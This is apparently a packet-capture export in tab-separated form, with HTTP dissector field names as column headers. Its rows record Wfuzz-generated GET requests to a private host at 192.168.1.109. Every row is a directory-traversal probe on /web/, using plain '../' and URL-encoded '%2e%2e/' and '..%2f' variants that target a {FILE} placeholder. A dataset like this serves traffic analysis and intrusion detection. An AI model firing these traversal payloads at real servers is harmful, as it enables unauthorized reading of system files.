http.accept	http.accept_encoding	http.accept_language	http.authbasic	http.authcitrix	http.authcitrix.domain	http.authcitrix.password	http.authcitrix.session	http.authcitrix.user	http.authorization	http.bad_header_name	http.cache_control	http.chat	http.chunk_boundary	http.chunk_size	http.chunkd_and_length	http.chunked_trailer_part	http.connection	http.content_encoding	http.content_length	http.content_length_header	http.content_type	http.cookie_pair	http.date	http.decompression_disabled	http.decompression_failed	http.file_data	http.host	http.http2_settings	http.http2_settings_uri	http.last_modified	http.leading_crlf	http.location	http.next_request_in	http.next_response_in	http.notification	http.prev_request_in	http.proxy_authenticate	http.proxy_authorization	http.proxy_connect_host	http.proxy_connect_port	http.referer	http.request	http.request.full_uri	http.request.line	http.request.method	http.request.uri.path	http.request.uri.query	http.request.uri.query.parameter	http.request.version	http.request_in	http.request_number	http.sec_websocket_accept	http.sec_websocket_extensions	http.sec_websocket_key	http.sec_websocket_protocol	http.sec_websocket_version	http.server	http.set_cookie	http.ssl_port	http.subdissector_failed	http.te_and_length	http.te_unknown	http.time	http.tls_port	http.transfer_encoding	http.unknown_header	http.upgrade	http.user_agent	http.www_authenticate	http.x_forwarded_for	http.cookie	http.request.uri
*/*																					application/x-www-form-urlencoded						192.168.1.109															1	http://192.168.1.109/web/../../../../../{FILE}/		GET				HTTP/1.1																			Wfuzz/3.1.0				/web/../../../../../{FILE}/
*/*																					application/x-www-form-urlencoded						192.168.1.109															1	http://192.168.1.109/web/../../../../{FILE}/		GET				HTTP/1.1																			Wfuzz/3.1.0				/web/../../../../{FILE}/
*/*																					application/x-www-form-urlencoded						192.168.1.109															1	http://192.168.1.109/web/../../../{FILE}/		GET				HTTP/1.1																			Wfuzz/3.1.0				/web/../../../{FILE}/
*/*																					application/x-www-form-urlencoded						192.168.1.109															1	http://192.168.1.109/web/../../{FILE}/		GET				HTTP/1.1																			Wfuzz/3.1.0				/web/../../{FILE}/
*/*																					application/x-www-form-urlencoded						192.168.1.109															1	http://192.168.1.109/web/../../../../../../{FILE}/		GET				HTTP/1.1																			Wfuzz/3.1.0				/web/../../../../../../{FILE}/
*/*																					application/x-www-form-urlencoded						192.168.1.109															1	http://192.168.1.109/web/../../../../../../../../{FILE}/		GET				HTTP/1.1																			Wfuzz/3.1.0				/web/../../../../../../../../{FILE}/
*/*																					application/x-www-form-urlencoded						192.168.1.109															1	http://192.168.1.109/web/%2e%2e/%2e%2e/%2e%2e/{FILE}/		GET				HTTP/1.1																			Wfuzz/3.1.0				/web/%2e%2e/%2e%2e/%2e%2e/{FILE}/
*/*,*/*																					application/x-www-form-urlencoded,application/x-www-form-urlencoded						192.168.1.109,192.168.1.109									131						1,1	http://192.168.1.109/web/..%2f..%2f..%2f..%2f{FILE}/,http://192.168.1.109/web/%2e%2e/%2e%2e/%2e%2e/%2e%2e/{FILE}/		GET,GET				HTTP/1.1,HTTP/1.1																			Wfuzz/3.1.0,Wfuzz/3.1.0				/web/..%2f..%2f..%2f..%2f{FILE}/,/web/%2e%2e/%2e%2e/%2e%2e/%2e%2e/{FILE}/
*/*																					application/x-www-form-urlencoded						192.168.1.109															1	http://192.168.1.109/web/%2e%2e/%2e%2e/{FILE}/		GET				HTTP/1.1																			Wfuzz/3.1.0				/web/%2e%2e/%2e%2e/{FILE}/
*/*,*/*,*/*,*/*																					application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded						192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109									173,173,173						1,1,1,1	http://192.168.1.109/web/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f{FILE}/,http://192.168.1.109/web/..%2f..%2f..%2f..%2f..%2f..%2f{FILE}/,http://192.168.1.109/web/..%2f..%2f..%2f..%2f..%2f{FILE}/,http://192.168.1.109/web/../../../../../../../{FILE}/		GET,GET,GET,GET				HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1																			Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0				/web/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f{FILE}/,/web/..%2f..%2f..%2f..%2f..%2f..%2f{FILE}/,/web/..%2f..%2f..%2f..%2f..%2f{FILE}/,/web/../../../../../../../{FILE}/
